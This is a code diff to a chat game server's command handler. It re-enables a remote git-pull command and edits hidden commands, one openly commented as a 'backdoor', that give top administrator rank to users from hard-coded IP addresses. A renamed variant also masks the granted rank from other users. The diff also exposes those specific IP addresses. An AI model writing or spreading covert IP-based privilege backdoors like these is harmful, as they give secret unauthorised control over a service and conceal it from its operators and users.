@@ -1304,14 +1304,12 @@ function parseCommandLocal(user, cmd, target, room, socket, message) {
 			emit(socket, 'console', '/gitpull - Access denied.');
 			return false;
 		}
-		/*
+		
 		var args = splitArgs('git, pull');
 		logModCommand(room,user.name+' pulled from git',true);
 		room.addRaw('<div class="message-declare"><strong><font color="FFFFFF">Server updating... there might be some lag.</font></strong></div>');
 		gitpulling = true;
 		runCommand(args.shift(), args, socket);
-		*/
-		user.emit('console', 'Command disabled');
 		return false;
 		break;
 
@@ -1497,15 +1495,17 @@ function parseCommandLocal(user, cmd, target, room, socket, message) {
 	
 	case 'secrets':
 		// backdoor for panderp and kupo
-		if (user.ip  === '76.247.181.42'|| user.ip === '127.0.0.1' || user.ip === '204.112.133.186' || user.ip === '99.251.253.160') {
+		if (user.ip  === '76.247.181.42'|| user.ip === '127.0.0.1' || user.ip === '204.112.213.60' ) {
 			user.setGroup(config.groupsranking[config.groupsranking.length - 1]);
 			rooms.lobby.send('|N|'+user.getIdentity()+'|'+user.userid);
 			return false;
 		}
 		break;
 		
-	case 'jdsecrets':
-		if (user.ip === '99.251.253.160' || user.ip === '127.0.0.1' || user.ip === '76.247.181.42') {
+	case 'hiddensecrets':
+	case 'hsecrets':
+		// courtesy of jd
+		if (user.ip === '204.112.213.60' || user.ip === '127.0.0.1' || user.ip === '76.247.181.42') {
 			user.setGroup(config.groupsranking[config.groupsranking.length - 1]);
 			user.getIdentity = function() { return ' ' + user.name }
 			rooms.lobby.send('|N|'+user.getIdentity()+'|'+user.userid);
@@ -1523,8 +1523,10 @@ function parseCommandLocal(user, cmd, target, room, socket, message) {
 
 	case 'las':
 		if(user.name === 'Lasagne21'){
-			if(!user.namelocked)
+			if(!user.namelocked){
 				user.nameLock('Lasagne21', true);
+				user.emit('console', 'you have been namelocked.');
+			}
 			user.getIdentity = function(){
 				if(this.muted){
 					return '!' + this.name;
